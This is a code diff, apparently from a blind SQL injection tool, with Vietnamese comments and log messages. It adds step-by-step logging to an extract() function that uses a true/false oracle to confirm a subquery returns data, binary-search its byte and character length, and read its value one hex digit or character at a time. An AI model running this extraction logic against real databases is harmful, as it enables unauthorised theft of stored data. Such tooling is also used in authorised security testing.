@@ -89,10 +89,12 @@ def extract(oracle: Oracle,
             dialect: dict,
             mode: str = "hex",
             maxlen: Optional[int] = None,
-            progress=None) -> tuple[bytes, dict]:
+            progress=None,
+            log=None) -> tuple[bytes, dict]:
     """Trích xuất giá trị của <query>. Trả về (raw_bytes, meta).
 
     progress(done, total, preview) - callback tùy chọn để hiện tiến độ.
+    log(msg)                        - callback tùy chọn in các bước chính.
     """
     dia = Dialect(dialect)
     meta = {}
@@ -101,19 +103,30 @@ def extract(oracle: Oracle,
         if progress:
             progress(done, total, preview)
 
+    def _log(msg):
+        if log:
+            log(msg)
+
     # 1) subquery có dữ liệu không? NULL làm mọi điều kiện thành false âm thầm.
+    _log("[extract] bước 1: kiểm tra subquery có dữ liệu (IS NOT NULL)...")
     if not oracle.ask(dia.notnull(query)):
         raise ExtractError(
             "subquery trả NULL hoặc không có row. Kiểm tra tên bảng/cột và quyền."
         )
 
     # 2) độ dài byte và ký tự -> phát hiện multibyte
+    _log("[extract] bước 2: đo độ dài bằng binary search (length / char_length)...")
     blen = get_number(oracle, dia.length(query))
     clen = get_number(oracle, dia.charlen(query))
     meta["byte_len"] = blen
     meta["char_len"] = clen
+    multibyte = "  <-- KHÁC NHAU: có ký tự multibyte" if blen != clen else ""
+    _log("[extract]   length()      = %d byte" % blen)
+    _log("[extract]   char_length() = %d ký tự%s" % (clen, multibyte))
 
     if mode == "hex":
+        _log("[extract] bước 3: đọc hex(value) - %d hex-digit, mỗi digit ~5 request "
+             "(binary search trên [0-9A-F])..." % (blen * 2))
         src = dia.hex(query)
         n = blen * 2
         if maxlen:
@@ -133,6 +146,8 @@ def extract(oracle: Oracle,
         return bytes.fromhex(digits), meta
 
     if mode == "char":
+        _log("[extract] bước 3: đọc trực tiếp từng ký tự - %s ký tự, mỗi ký tự ~8 request "
+             "(binary search trên [0-255])..." % (maxlen or clen))
         n = maxlen or clen
         out = bytearray()
         for i in range(1, n + 1):
